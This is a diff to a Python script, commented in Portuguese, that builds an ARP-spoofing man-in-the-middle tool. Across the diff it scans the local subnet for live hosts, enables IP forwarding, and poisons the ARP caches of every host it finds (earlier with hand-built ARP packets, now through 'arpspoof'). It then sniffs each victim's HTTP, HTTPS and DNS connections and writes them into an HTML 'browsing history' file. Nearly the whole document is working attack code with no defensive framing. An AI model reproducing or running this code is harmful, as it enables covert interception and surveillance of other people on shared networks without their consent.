@@ -2,7 +2,8 @@ import os
 import socket
 import struct
 import threading
-from time import sleep, time
+from queue import Queue
+from time import sleep, strftime
 from datetime import datetime
 
 
@@ -35,63 +36,49 @@ def log_to_history(file_path, ip):
         print(f"[+] Registrado no histórico: {ip}")
 
 
-def discover_hosts(local_ip, history_file, duration=60):
-    """Procura IPs ativos na sub-rede do IP local dentro de um período de tempo."""
-    subnet = ".".join(local_ip.split(".")[:3])  # Determina a sub-rede (ex.: 192.168.1)
-    print(f"[*] Varredura na sub-rede: {subnet}.0/24")
-    active_hosts = []
-    start_time = time()
-
-    for i in range(1, 255):  # Varre todos os IPs da sub-rede
-        target_ip = f"{subnet}.{i}"
-        if time() - start_time > duration:
-            break  # Interrompe após a duração especificada
-        if target_ip == local_ip:
-            continue  # Ignora o IP local
-        if is_host_alive(target_ip):
-            log_to_history(history_file, target_ip)  # Atualiza o histórico
-            active_hosts.append(target_ip)
-
-    print("[*] Varredura concluída.")
-    return active_hosts
-
-
 def is_host_alive(ip):
     """Verifica se um host está ativo enviando um pacote ICMP (ping)."""
     try:
-        response = os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1")
-        return response == 0
-    except Exception:
+        result = os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1")
+        return result == 0
+    except Exception as e:
+        print(f"[!] Erro ao verificar host {ip}: {e}")
         return False
 
 
-def build_arp_packet(op, src_mac, src_ip, target_mac, target_ip):
-    """Constrói um pacote ARP em formato binário."""
-    broadcast_mac = b'\xff\xff\xff\xff\xff\xff' if target_mac is None else bytes.fromhex(target_mac.replace(':', ''))
-    eth_header = struct.pack("!6s6sH", broadcast_mac, bytes.fromhex(src_mac.replace(':', '')), 0x0806)
-    arp_header = struct.pack(
-        "!HHBBH6s4s6s4s",
-        1,  # Hardware type (Ethernet)
-        0x0800,  # Protocol type (IPv4)
-        6,  # Hardware size (MAC size)
-        4,  # Protocol size (IPv4 size)
-        op,  # Operation (1=Request, 2=Reply)
-        bytes.fromhex(src_mac.replace(':', '')),  # Sender MAC address
-        socket.inet_aton(src_ip),  # Sender IP address
-        broadcast_mac,  # Target MAC address
-        socket.inet_aton(target_ip)  # Target IP address
-    )
-    return eth_header + arp_header
+def discover_hosts(local_ip, active_hosts, history_file, thread_count=50):
+    """Realiza a varredura de IPs ativos na sub-rede."""
+    subnet = ".".join(local_ip.split(".")[:3])  # Determina a sub-rede (ex.: 192.168.1)
+    print(f"[*] Iniciando varredura na sub-rede: {subnet}.0/24")
 
+    ip_queue = Queue()
+    for i in range(1, 255):
+        ip_queue.put(f"{subnet}.{i}")
 
-def send_arp_reply(interface, src_mac, src_ip, target_mac, target_ip):
-    """Envia pacotes ARP para o alvo."""
-    raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-    raw_socket.bind((interface, 0))
-    arp_packet = build_arp_packet(2, src_mac, src_ip, target_mac, target_ip)
-    while True:
-        raw_socket.send(arp_packet)
-        sleep(1)  # Evita congestionamento com envio constante
+    def worker():
+        """Thread para verificar se hosts estão ativos."""
+        while not ip_queue.empty():
+            ip = ip_queue.get()
+            if is_host_alive(ip):
+                with threading.Lock():
+                    if ip not in active_hosts:
+                        active_hosts.append(ip)
+                        log_to_history(history_file, ip)
+            ip_queue.task_done()
+
+    threads = []
+    for _ in range(thread_count):
+        t = threading.Thread(target=worker)
+        t.start()
+        threads.append(t)
+
+    ip_queue.join()
+
+    for t in threads:
+        t.join()
+
+    print("[*] Varredura concluída.")
+    print("[*] IPs ativos encontrados:", active_hosts)
 
 
 def enable_ip_forwarding():
@@ -104,67 +91,120 @@ def disable_ip_forwarding():
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
 
-def main():
-    # Configurações
-    history_file = "historico_ips.txt"
+def arp_spoof(interface, target_ip, spoof_ip):
+    """Executa o ARP Spoofing usando o comando arpspoof."""
+    os.system(f"sudo arpspoof -i {interface} -t {target_ip} {spoof_ip}")
 
-    # Detecta informações locais
-    interface = os.listdir('/sys/class/net/')[0]  # Pega a primeira interface disponível
+
+def verify_arp_table():
+    """Verifica a tabela ARP no sistema."""
+    os.system("arp -n")
+
+
+def sniff_traffic(interface, target_ip, output_file):
+    """Captura e registra o tráfego HTTP/HTTPS/DNS do alvo."""
+    print(f"[*] Monitorando tráfego de {target_ip}")
+    raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
+    packets_received = 0  # Contador de pacotes recebidos
+
+    with open(output_file, "a") as html_file:
+        try:
+            while True:
+                packet, _ = raw_socket.recvfrom(65565)
+                eth_header = packet[:14]
+                eth_data = struct.unpack("!6s6sH", eth_header)
+                if socket.ntohs(eth_data[2]) == 0x0800:  # IPv4
+                    ip_header = packet[14:34]
+                    iph = struct.unpack("!BBHHHBBH4s4s", ip_header)
+                    protocol = iph[6]
+                    src_ip = socket.inet_ntoa(iph[8])
+                    dest_ip = socket.inet_ntoa(iph[9])
+                    if src_ip == target_ip or dest_ip == target_ip:
+                        if protocol == 6:  # TCP
+                            tcp_header = packet[34:54]
+                            tcph = struct.unpack('!HHLLBBHHH', tcp_header)
+                            src_port = tcph[0]
+                            dest_port = tcph[1]
+
+                            if src_port == 80 or dest_port == 80:  # HTTP
+                                packets_received += 1
+                                timestamp = strftime("%Y-%m-%d %H:%M:%S")
+                                html_file.write(f"<li>{timestamp} - {src_ip} -> {dest_ip} [HTTP]</li>\n")
+                                html_file.flush()
+                            elif src_port == 443 or dest_port == 443:  # HTTPS
+                                packets_received += 1
+                                timestamp = strftime("%Y-%m-%d %H:%M:%S")
+                                html_file.write(f"<li>{timestamp} - {src_ip} -> {dest_ip} [HTTPS]</li>\n")
+                                html_file.flush()
+
+                        elif protocol == 17:  # UDP
+                            udp_header = packet[34:42]
+                            udph = struct.unpack('!HHHH', udp_header)
+                            src_port = udph[0]
+                            dest_port = udph[1]
+
+                            if src_port == 53 or dest_port == 53:  # DNS
+                                packets_received += 1
+                                timestamp = strftime("%Y-%m-%d %H:%M:%S")
+                                html_file.write(f"<li>{timestamp} - {src_ip} -> {dest_ip} [DNS]</li>\n")
+                                html_file.flush()
+
+                        if packets_received == 1:  # Primeira ocorrência de tráfego detectado
+                            print(f"[+] Tráfego detectado do alvo {target_ip}.")
+        except KeyboardInterrupt:
+            print(f"[!] Monitoramento de {target_ip} interrompido.")
+        finally:
+            html_file.write(f"</ul></body></html>\n")
+            print(f"[*] Total de pacotes recebidos do alvo {target_ip}: {packets_received}")
+
+
+def main():
     local_ip = get_local_ip()
+    interface = os.listdir('/sys/class/net/')[0]  # Usa a primeira interface disponível
     local_mac = get_mac(interface)
 
     if not local_mac:
         print("[!] Não foi possível obter o endereço MAC local.")
         return
 
-    print(f"[+] Interface de rede detectada: {interface}")
-    print(f"[+] IP local detectado: {local_ip}")
-    print(f"[+] MAC local detectado: {local_mac}")
+    print(f"[+] Interface detectada: {interface}")
+    print(f"[+] IP local: {local_ip}")
+    print(f"[+] MAC local: {local_mac}")
 
-    # Varredura para encontrar hosts ativos
-    active_hosts = discover_hosts(local_ip, history_file, duration=30)
-
-    if not active_hosts:
-        print("[!] Nenhum host ativo encontrado para atacar.")
-        return
-
-    # Exibe os hosts ativos e permite escolher um
-    print("\nHosts ativos encontrados:")
-    for idx, ip in enumerate(active_hosts):
-        print(f"{idx + 1}. {ip}")
-
-    try:
-        choice = int(input("\nEscolha o número do IP a ser atacado: ")) - 1
-        target_ip = active_hosts[choice]
-    except (ValueError, IndexError):
-        print("[!] Escolha inválida.")
-        return
-
-    # Determina o IP do gateway (assumindo o .1 da sub-rede como gateway)
-    gateway_ip = ".".join(local_ip.split(".")[:3]) + ".1"
-
-    print(f"[+] Gateway detectado: {gateway_ip}")
-
-    # Inicia ataque ARP Spoofing
-    print("[*] Habilitando IP forwarding...")
     enable_ip_forwarding()
 
-    print("[*] Iniciando ataque ARP Spoofing...")
-    try:
-        # Thread para enviar pacotes ARP para o alvo
-        threading.Thread(target=send_arp_reply, args=(interface, local_mac, gateway_ip, None, target_ip)).start()
+    active_hosts = []
+    history_file = "historico_ips.txt"
+    traffic_file = "historico_trafego.html"
 
-        # Thread para enviar pacotes ARP para o gateway
-        threading.Thread(target=send_arp_reply, args=(interface, local_mac, target_ip, None, gateway_ip)).start()
+    with open(traffic_file, "w") as html_file:
+        html_file.write("<html><head><title>Histórico de Navegação</title></head><body><ul>\n")
 
-        # Mantém o programa rodando
-        while True:
-            sleep(1)
-    except KeyboardInterrupt:
-        print("[!] Interrompendo ataque...")
-    finally:
-        print("[*] Restaurando configurações...")
+    discover_hosts(local_ip, active_hosts, history_file)
+
+    if len(active_hosts) < 2:
+        print("[!] Não há IPs suficientes para realizar o ataque ARP Spoofing.")
         disable_ip_forwarding()
+        return
+
+    try:
+        threads = []
+        for target_ip in active_hosts:
+            print(f"[*] Executando ARP Spoofing contra {target_ip}...")
+            spoof_thread = threading.Thread(target=arp_spoof, args=(interface, target_ip, local_ip))
+            sniff_thread = threading.Thread(target=sniff_traffic, args=(interface, target_ip, traffic_file))
+            threads.append(spoof_thread)
+            threads.append(sniff_thread)
+            spoof_thread.start()
+            sniff_thread.start()
+        for t in threads:
+            t.join()
+    except KeyboardInterrupt:
+        print("[!] Ataque ARP Spoofing interrompido.")
+    finally:
+        disable_ip_forwarding()
+        print("[*] Verificando tabelas ARP...")
+        verify_arp_table()
 
 
 if __name__ == "__main__":
